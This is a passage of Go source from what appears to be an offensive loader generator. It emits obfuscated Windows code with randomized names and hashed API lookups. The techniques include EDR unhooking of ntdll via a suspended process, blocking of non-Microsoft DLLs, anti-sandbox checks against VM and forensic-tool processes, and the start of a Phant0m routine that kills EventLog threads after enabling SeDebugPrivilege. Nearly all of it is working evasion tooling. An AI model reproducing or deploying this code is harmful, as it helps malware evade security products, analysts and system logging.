    {{.Vars.r1}}, _, {{.Vars.err}} := {{.Vars.NtProtectVirtualMemory}}.Call(uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&{{.Vars.dll_offset}})), uintptr(unsafe.Pointer(&{{.Vars.regionsize}})), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&{{.Vars.oldProtect}})))
    if {{.Vars.r1}} != 0 {
      return {{.Vars.err}}
    }

    for {{.Vars.i}} := 0; {{.Vars.i}} < len({{.Vars.dll_bytes}}); {{.Vars.i}}++ {
      {{.Vars.loc}} := uintptr({{.Vars.dll_offset}} + uint({{.Vars.i}}))
      {{.Vars.mem}} := (*[1]byte)(unsafe.Pointer({{.Vars.loc}}))
      (*{{.Vars.mem}})[0] = {{.Vars.dll_bytes}}[{{.Vars.i}}]
    }

    {{.Vars.r2}}, _, {{.Vars.err}} := {{.Vars.NtProtectVirtualMemory}}.Call(uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&{{.Vars.dll_offset}})), uintptr(unsafe.Pointer(&{{.Vars.regionsize}})), {{.Vars.oldProtect}}, uintptr(unsafe.Pointer(&{{.Vars.oldProtect}})))
    if {{.Vars.r2}} != 0 {
      return {{.Vars.err}}
    }
  }

  return nil
}
`

  } else if (unhook == "peruns") {

    imports = utils.AppendSlice(imports, []string{"time", "debug/pe", "golang.org/x/sys/windows", "unsafe", "strings"}) // needed imports
    dlls_to_unhook = utils.AppendString(dlls_to_unhook, "C:\\Windows\\System32\\ntdll.dll")

    Main.Vars["unhook_func"] = utils.RandomString(utils.RandomInt(10,12))
    Main.Vars["dlls_to_unhook"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["dll_to_unhook"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["GetConsoleWindow"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ShowWindow"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["CreateProcessW"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["GetCurrentProcess"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["WriteProcessMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ReadProcessMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["TerminateProcess"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["kernel32"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["hwnd"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["SW_HIDE"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["si"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["pi"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["cmd"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["err"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["pHandle"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["file"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["x"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["size"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["dll"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["dll_handle"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["dll_base"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["dll_offset"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["data"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["nbr"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["r1"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ntdll_bytes"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ntdll_offset"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["nLength"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["r2"] = utils.RandomString(utils.RandomInt(9,10))

    unhook_func = `
func {{.Vars.unhook_func}}({{.Vars.dlls_to_unhook}} []string) error {
`

    if (hashing) {
      unhook_func = unhook_func + `
  {{.Vars.ShowWindow}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("ShowWindow", rand_num)) + `, ` + ObfuscateStr("user32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.GetConsoleWindow}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("GetConsoleWindow", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.CreateProcessW}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("CreateProcessW", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.GetCurrentProcess}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("GetCurrentProcess", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.WriteProcessMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("WriteProcessMemory", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.ReadProcessMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("ReadProcessMemory", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.TerminateProcess}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("TerminateProcess", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
`
    } else {
      unhook_func = unhook_func + `
  {{.Vars.ShowWindow}} := windows.NewLazyDLL(` + ObfuscateStr("user32.dll", str_obfs) + `).NewProc(` + ObfuscateStr("ShowWindow", str_obfs) + `)
  {{.Vars.kernel32}} := windows.NewLazyDLL(` + ObfuscateStr("kernel32.dll", str_obfs) + `)
  {{.Vars.GetConsoleWindow}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("GetConsoleWindow", str_obfs) + `)
  {{.Vars.CreateProcessW}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("CreateProcessW", str_obfs) + `)
  {{.Vars.GetCurrentProcess}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("GetCurrentProcess", str_obfs) + `)
  {{.Vars.WriteProcessMemory}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("WriteProcessMemory", str_obfs) + `)
	{{.Vars.ReadProcessMemory}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("ReadProcessMemory", str_obfs) + `)
  {{.Vars.TerminateProcess}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("TerminateProcess", str_obfs) + `)
`
    }
  
  unhook_func = unhook_func + `
  {{.Vars.hwnd}}, _, {{.Vars.err}} := {{.Vars.GetConsoleWindow}}.Call()
  if {{.Vars.hwnd}} == 0 {
    return {{.Vars.err}}
  }

  var {{.Vars.SW_HIDE}} uintptr = 0
  {{.Vars.ShowWindow}}.Call({{.Vars.hwnd}}, {{.Vars.SW_HIDE}})

  {{.Vars.si}} := &windows.StartupInfo{}
  {{.Vars.pi}} := &windows.ProcessInformation{}

  {{.Vars.cmd}}, {{.Vars.err}} := windows.UTF16PtrFromString(` + ObfuscateStr(process, str_obfs) + `)
  if {{.Vars.err}} != nil {
    return {{.Vars.err}}
  }

  {{.Vars.CreateProcessW}}.Call(0, uintptr(unsafe.Pointer({{.Vars.cmd}})), 0, 0, 0, windows.CREATE_SUSPENDED, 0, 0, uintptr(unsafe.Pointer({{.Vars.si}})), uintptr(unsafe.Pointer({{.Vars.pi}})))

  {{.Vars.pHandle}}, _, _ := {{.Vars.GetCurrentProcess}}.Call()

  time.Sleep(5 * time.Second)

  for _, {{.Vars.dll_to_unhook}} := range {{.Vars.dlls_to_unhook}} {
    if (!strings.HasPrefix({{.Vars.dll_to_unhook}}, "C:\\")) {
      {{.Vars.dll_to_unhook}} = "C:\\Windows\\System32\\" + {{.Vars.dll_to_unhook}}
    }

    {{.Vars.file}}, {{.Vars.err}} := pe.Open({{.Vars.dll_to_unhook}})
    if {{.Vars.err}} != nil {
      return {{.Vars.err}}
    }

    {{.Vars.x}} := {{.Vars.file}}.Section(` + ObfuscateStr(".text", str_obfs) + `)
    {{.Vars.size}} := {{.Vars.x}}.Size

    {{.Vars.dll}}, {{.Vars.err}} := windows.LoadDLL({{.Vars.dll_to_unhook}})
    if {{.Vars.err}} != nil {
      return {{.Vars.err}}
    }

    {{.Vars.dll_handle}} := {{.Vars.dll}}.Handle
    {{.Vars.dll_base}} := uintptr({{.Vars.dll_handle}})
    {{.Vars.dll_offset}} := uint({{.Vars.dll_base}}) + uint({{.Vars.x}}.VirtualAddress)

    var {{.Vars.data}} = make([]byte, {{.Vars.size}})
    var {{.Vars.nbr}} uintptr = 0

    {{.Vars.r1}}, _, {{.Vars.err}} := {{.Vars.ReadProcessMemory}}.Call(uintptr({{.Vars.pi}}.Process), uintptr({{.Vars.dll_offset}}), uintptr(unsafe.Pointer(&{{.Vars.data}}[0])), uintptr({{.Vars.size}}), uintptr(unsafe.Pointer(&{{.Vars.nbr}})))
    if {{.Vars.r1}} == 0 {
      return {{.Vars.err}}
    }

    {{.Vars.ntdll_bytes}} := {{.Vars.data}}
    {{.Vars.ntdll_offset}} := {{.Vars.dll_offset}}

    var {{.Vars.nLength}} uintptr
    {{.Vars.r2}}, _, {{.Vars.err}} := {{.Vars.WriteProcessMemory}}.Call({{.Vars.pHandle}}, uintptr({{.Vars.ntdll_offset}}), uintptr(unsafe.Pointer(&{{.Vars.ntdll_bytes}}[0])), uintptr(uint32(len({{.Vars.ntdll_bytes}}))), uintptr(unsafe.Pointer(&{{.Vars.nLength}})))
    if {{.Vars.r2}} == 0 {
      return {{.Vars.err}}
    }

    {{.Vars.TerminateProcess}}.Call(uintptr({{.Vars.pi}}.Process), 0)
  }

  return nil
}
`
  }

  if (unhook != "") {
    // append previous function
    functions = utils.AppendString(functions, ParseTemplate(unhook_func, Main))
  }


  // add ACG Guard function to loader
  if (acg) {

    if (verbose) {
      fmt.Println("  > Adding ACG Guard protection...")
    }
    time.Sleep(100 * time.Millisecond)

    // define variables
    Main.Vars["acg_func"] = utils.RandomString(utils.RandomInt(10,12))
    Main.Vars["kernel32"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["SetProcessMitigationPolicy"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ProcessDynamicCodePolicy"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["dcp"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ret"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["err"] = utils.RandomString(utils.RandomInt(9,10))

    PROCESS_MITIGATION_DYNAMIC_CODE_POLICY := `
type PROCESS_MITIGATION_DYNAMIC_CODE_POLICY struct {
  ProhibitDynamicCode uint32
}
`
    // append needed exports and imports
    exports = utils.AppendString(exports, PROCESS_MITIGATION_DYNAMIC_CODE_POLICY)
    imports = utils.AppendSlice(imports, []string{"golang.org/x/sys/windows", "unsafe", "errors", "fmt"})

    // define code using templates
    acg_func := `
func {{.Vars.acg_func}}() error {`

  if (hashing) {
    acg_func = acg_func + `
    {{.Vars.SetProcessMitigationPolicy}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("SetProcessMitigationPolicy", rand_num)) + `, ` + ObfuscateStr("C:\\Windows\\System32\\kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
`
  } else {
    acg_func = acg_func + `
  {{.Vars.SetProcessMitigationPolicy}} := windows.NewLazyDLL(` + ObfuscateStr("kernel32.dll", str_obfs) + `).NewProc(` + ObfuscateStr("SetProcessMitigationPolicy", str_obfs) + `)
`
  }

    acg_func = acg_func + `
  var {{.Vars.ProcessDynamicCodePolicy}} int32 = 2
  var {{.Vars.dcp}} PROCESS_MITIGATION_DYNAMIC_CODE_POLICY
  {{.Vars.dcp}}.ProhibitDynamicCode = 1

  {{.Vars.ret}}, _, {{.Vars.err}} := {{.Vars.SetProcessMitigationPolicy}}.Call(
    uintptr({{.Vars.ProcessDynamicCodePolicy}}),
    uintptr(unsafe.Pointer(&{{.Vars.dcp}})),
    unsafe.Sizeof({{.Vars.dcp}}),
  )

  if {{.Vars.ret}} != 1 {
    return errors.New(fmt.Sprintf(` + ObfuscateStr("error: %s", str_obfs) + `, {{.Vars.err}}))
  }

  return nil
}
`

    // append previous function
    functions = utils.AppendString(functions, ParseTemplate(acg_func, Main))
  }

  if (blockdlls) {
    if (verbose) {
      fmt.Println("  > Adding blockdlls function...")
    }
    time.Sleep(100 * time.Millisecond)

    process_mitigation_binary_signature_policy := `
type PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY struct {
  Flags uint32
}
`

    Main.Vars["blockdlls_func"] = utils.RandomString(utils.RandomInt(8,9))
    Main.Vars["kernel32"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["SetProcessMitigationPolicy"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ProcessSignaturePolicy"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["sp"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ret"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["err"] = utils.RandomString(utils.RandomInt(9,10))
    
    exports = utils.AppendString(exports, process_mitigation_binary_signature_policy)
    imports = utils.AppendSlice(imports, []string{"golang.org/x/sys/windows", "unsafe", "errors", "fmt"})

    blockdlls_func := `
func {{.Vars.blockdlls_func}}() error {`

    if (hashing) {
      blockdlls_func = blockdlls_func + `
  {{.Vars.SetProcessMitigationPolicy}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("SetProcessMitigationPolicy", rand_num)) + `, ` + ObfuscateStr("C:\\Windows\\System32\\kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
`    
    } else {
      blockdlls_func = blockdlls_func + `
  {{.Vars.kernel32}} := windows.NewLazyDLL(` + ObfuscateStr("kernel32.dll", str_obfs) + `)
  {{.Vars.SetProcessMitigationPolicy}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("SetProcessMitigationPolicy", str_obfs) + `)
`
    }

    blockdlls_func = blockdlls_func + `
  var {{.Vars.ProcessSignaturePolicy}} uint32 = 8
  var {{.Vars.sp}} PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY

  {{.Vars.sp}}.Flags = 0x1

  {{.Vars.ret}}, _, {{.Vars.err}} := {{.Vars.SetProcessMitigationPolicy}}.Call(
    uintptr({{.Vars.ProcessSignaturePolicy}}),
    uintptr(unsafe.Pointer(&{{.Vars.sp}})),
    unsafe.Sizeof({{.Vars.sp}}),
  )

  if {{.Vars.ret}} == 0 {
    return errors.New(fmt.Sprintf(` + ObfuscateStr("error: %s", str_obfs) + `, {{.Vars.err}}))
  }

  return nil
}
`

    // append previous function
    functions = utils.AppendString(functions, ParseTemplate(blockdlls_func, Main))
  }

  if (sandbox) {

    if (verbose) {
      fmt.Println("  > Adding anti-sandboxing techniques...")
    }
    time.Sleep(100 * time.Millisecond)

    Main.Vars["sandbox_func"] = utils.RandomString(utils.RandomInt(10,12))
    Main.Vars["isProcessRunning"] = utils.RandomString(utils.RandomInt(10,12))
    Main.Vars["client"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["err"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["msx"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["r1"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["process"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["processes"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["processName"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["hSnap"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["pe32"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ret"] = utils.RandomString(utils.RandomInt(9,10))

    Main.Vars["GlobalMemoryStatusEx"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["CreateToolhelp32Snapshot"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["CloseHandle"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["Process32First"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["Process32NextW"] = utils.RandomString(utils.RandomInt(9,10))

    memStatusEx := `
type memStatusEx struct {
  dwLength uint32
  dwMemoryLoad uint32
  ullTotalPhys uint64
  ullAvailPhys uint64
  ullTotalPageFile uint64
  ullAvailPageFile uint64
  ullTotalVirtual uint64
  ullAvailVirtual uint64
  ullAvailExtendedVirtual uint64
}
`

    processentry32 := `
type PROCESSENTRY32 struct {
  dwSize              uint32
  cntUsage            uint32
  th32ProcessID       uint32
  th32DefaultHeapID   uintptr
  th32ModuleID        uint32
  cntThreads          uint32
  th32ParentProcessID uint32
  pcPriClassBase      int32
  dwFlags             uint32
  szExeFile           [260]uint16
}
`

    processes_list := `
var {{.Vars.processes}} []string = []string{
  ` + ObfuscateStr("vboxservice.exe", str_obfs) + `,
  ` + ObfuscateStr("vboxtray.exe", str_obfs) + `,
  ` + ObfuscateStr("vmtoolsd.exe", str_obfs) + `,
  ` + ObfuscateStr("vmwaretray.exe", str_obfs) + `,
  ` + ObfuscateStr("vmware.exe", str_obfs) + `,
  ` + ObfuscateStr("vmware-vmx.exe", str_obfs) + `,
  ` + ObfuscateStr("vmwareuser", str_obfs) + `,
  ` + ObfuscateStr("VGAuthService.exe", str_obfs) + `,
  ` + ObfuscateStr("vmacthlp.exe", str_obfs) + `,
  ` + ObfuscateStr("vmsrvc.exe", str_obfs) + `,
  ` + ObfuscateStr("vmusrvc.exe", str_obfs) + `,
  ` + ObfuscateStr("xenservice.exe", str_obfs) + `,
  ` + ObfuscateStr("qemu-ga.exe", str_obfs) + `,
  ` + ObfuscateStr("wireshark.exe", str_obfs) + `,
  ` + ObfuscateStr("Procmon.exe", str_obfs) + `,
  ` + ObfuscateStr("Procmon64.exe", str_obfs) + `,
  ` + ObfuscateStr("volatily.exe", str_obfs) + `,
  ` + ObfuscateStr("volatily3.exe", str_obfs) + `,
  ` + ObfuscateStr("DumpIt.exe", str_obfs) + `,
  ` + ObfuscateStr("dumpit.exe", str_obfs) + `,
}
`

    // append needed imports and exports
    imports = utils.AppendSlice(imports, []string{"time", "golang.org/x/sys/windows", "unsafe", "net/http", "runtime", "strings"})
    exports = utils.AppendSlice(exports, []string{memStatusEx, processentry32, ParseTemplate(processes_list, Main)})

    // define code using templates
    sandbox_func := `
func {{.Vars.sandbox_func}}() bool {
  if (runtime.NumCPU() <= 2) {
    return true
  }

  {{.Vars.client}} := http.Client{Timeout: 3 * time.Second}
  _, {{.Vars.err}} := {{.Vars.client}}.Get(` + ObfuscateStr("https://google.com", str_obfs) + `)

  if {{.Vars.err}} != nil {
    return true
  }

  {{.Vars.msx}} := &memStatusEx{dwLength: 64}
`

  if (hashing) {
    sandbox_func = sandbox_func + `
  {{.Vars.GlobalMemoryStatusEx}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("GlobalMemoryStatusEx", rand_num)) + `,` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.r1}}, _, _ := {{.Vars.GlobalMemoryStatusEx}}.Call(uintptr(unsafe.Pointer({{.Vars.msx}})))
`
  } else {
    sandbox_func = sandbox_func + `
  {{.Vars.r1}}, _, _ := windows.MustLoadDLL(` + ObfuscateStr("kernel32.dll", str_obfs) + `).MustFindProc(` + ObfuscateStr("GlobalMemoryStatusEx", str_obfs) + `).Call(uintptr(unsafe.Pointer({{.Vars.msx}})))
`
  }

  sandbox_func = sandbox_func + `
  if ({{.Vars.r1}} == 0) || ({{.Vars.msx}}.ullTotalPhys < 4174967296) {
    return true
  }

  for _, {{.Vars.process}} := range {{.Vars.processes}} {
    if {{.Vars.isProcessRunning}}({{.Vars.process}}) {
      return true
    }
  }

  return false
}
`
  processes_func := `
func {{.Vars.isProcessRunning}}({{.Vars.processName}} string) bool {`

  if (hashing) {
    processes_func = processes_func + `
  {{.Vars.CreateToolhelp32Snapshot}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("CreateToolhelp32Snapshot", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})`
  } else {
    processes_func = processes_func + `
  {{.Vars.CreateToolhelp32Snapshot}} := windows.MustLoadDLL(` + ObfuscateStr("kernel32.dll", str_obfs) + `).MustFindProc(` + ObfuscateStr("CreateToolhelp32Snapshot", str_obfs) + `)`
  }

  processes_func = processes_func + `
  {{.Vars.hSnap}}, _, _ := {{.Vars.CreateToolhelp32Snapshot}}.Call(uintptr(0x00000002), 0)
  if {{.Vars.hSnap}} == uintptr(^uintptr(0)) {
    return false
  }
  `

  if (hashing) {
    processes_func = processes_func + `
  {{.Vars.CloseHandle}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("CloseHandle", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  defer {{.Vars.CloseHandle}}.Call({{.Vars.hSnap}})
`
  } else {
    processes_func = processes_func + `defer windows.NewLazyDLL(` + ObfuscateStr("kernel32.dll", str_obfs) + `).NewProc(` + ObfuscateStr("CloseHandle", str_obfs) + `).Call({{.Vars.hSnap}})
`
  }

  processes_func = processes_func + `
  var {{.Vars.pe32}} PROCESSENTRY32
  {{.Vars.pe32}}.dwSize = uint32(unsafe.Sizeof({{.Vars.pe32}}))
  
  `
  
  if (hashing) {
    processes_func = processes_func + `{{.Vars.Process32First}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("Process32First", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.ret}}, _, _ := {{.Vars.Process32First}}.Call({{.Vars.hSnap}}, uintptr(unsafe.Pointer(&{{.Vars.pe32}})))
`
  } else {
    processes_func = processes_func + `{{.Vars.ret}}, _, _ := windows.NewLazyDLL(` + ObfuscateStr("kernel32.dll", str_obfs) + `).NewProc(` + ObfuscateStr("Process32First", str_obfs) + `).Call({{.Vars.hSnap}}, uintptr(unsafe.Pointer(&{{.Vars.pe32}})))
`
  }

  processes_func = processes_func + `
  if {{.Vars.ret}} != 0 {
    if strings.EqualFold({{.Vars.processName}}, windows.UTF16ToString({{.Vars.pe32}}.szExeFile[:])) {
      return true
    }
    `

  if (hashing) {
    processes_func = processes_func + `
    {{.Vars.Process32NextW}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("Process32NextW", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
    {{.Vars.ret}}, _, _ = {{.Vars.Process32NextW}}.Call({{.Vars.hSnap}}, uintptr(unsafe.Pointer(&{{.Vars.pe32}})))
  }`
  } else {
    processes_func = processes_func + `
    {{.Vars.ret}}, _, _ = windows.NewLazyDLL(` + ObfuscateStr("kernel32.dll", str_obfs) + `).NewProc(` + ObfuscateStr("Process32NextW", str_obfs) + `).Call({{.Vars.hSnap}}, uintptr(unsafe.Pointer(&{{.Vars.pe32}})))
  }`
  }

  processes_func = processes_func + `
  
  return false
}
`

    functions = utils.AppendString(functions, ParseTemplate(sandbox_func, Main))
    functions = utils.AppendString(functions, ParseTemplate(processes_func, Main))
  }

  // add Phant0m function to loader
  if (phantom) {
    if (verbose) {
      fmt.Println("  > Adding Phant0m technique to suspend EventLog threads...")
    }
    time.Sleep(100 * time.Millisecond)

    pthread_basic_info_struct := `
type PTHREAD_BASIC_INFORMATION struct {
  exitStatus      int32
  pTebBaseAddress uintptr
  clientId        CLIENT_ID
  AffinityMask    uintptr
  Priority        int
  BasePriority    int
  v               int
}
`

    sc_service_tag_query_struct := `
type SC_SERVICE_TAG_QUERY struct {
  processId uint32
  serviceTag uint32
  reserved uint32
  pBuffer unsafe.Pointer
}
`

    client_id_struct := `
type CLIENT_ID struct {
  UniqueProcess uintptr
  UniqueThread uintptr
}
`

    // append needed exports and imports
    exports = utils.AppendSlice(exports, []string{pthread_basic_info_struct, sc_service_tag_query_struct, client_id_struct})
    imports = utils.AppendSlice(imports, []string{"unsafe", "golang.org/x/sys/windows"})

    Main.Vars["phantom_func"] = utils.RandomString(utils.RandomInt(10,12))
    Main.Vars["get_eventlog_pid_func"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["elevate_process_token_func"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["SeDebugPrivilege"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["tokenAdjustPrivileges"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["tokenQuery"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["hToken"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["GetCurrentProcess"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["GetLastError"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["OpenProcessToken"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["LookupPrivilegeValue"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["AdjustTokenPrivileges"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["kernel32"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["advapi32"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["currentProcess"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["result"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["err"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["SePrivilegeEnabled"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["tkp"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["OpenSCManager"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["OpenService"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["QueryServiceStatusEx"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ssp"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["dwBytesNeeded"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["scm"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["svc"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["pid"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["NtQueryInformationThread"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["I_QueryTagInformation"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["OpenThread"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["OpenProcess"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["TerminateThread"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["CloseHandle"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ReadProcessMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["CreateToolhelp32Snapshot"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["Thread32First"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["Thread32Next"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ntdll"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["advapi32"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["kernel32"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["hThreads"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["tbi"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["te32"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["hEvtThread"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["hEvtProcess"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["scTagQuery"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["hTag"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["pN"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["eventlog_pid"] = utils.RandomString(utils.RandomInt(9,10))

    elevate_process_token_func := `
func {{.Vars.elevate_process_token_func}}() error {
  type Luid struct {
    lowPart uint32
    highPart int32
  }

  type LuidAndAttributes struct {
    luid Luid
    attributes uint32
  }

  type TokenPrivileges struct {
    privilegeCount uint32
    privileges [1]LuidAndAttributes
  }

  {{.Vars.SeDebugPrivilege}} := ` + ObfuscateStr("SeDebugPrivilege", str_obfs) + `
  const {{.Vars.tokenAdjustPrivileges}} = 0x0020
  const {{.Vars.tokenQuery}} = 0x0008
  var {{.Vars.hToken}} uintptr
`

    if (hashing) {
      elevate_process_token_func = elevate_process_token_func + `
  {{.Vars.GetCurrentProcess}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("GetCurrentProcess", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.GetLastError}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("GetLastError", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.OpenProcessToken}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("OpenProcessToken", rand_num)) + `, ` + ObfuscateStr("advapi32.dll", str_obfs) + `, {{.Vars.hashing_func}})
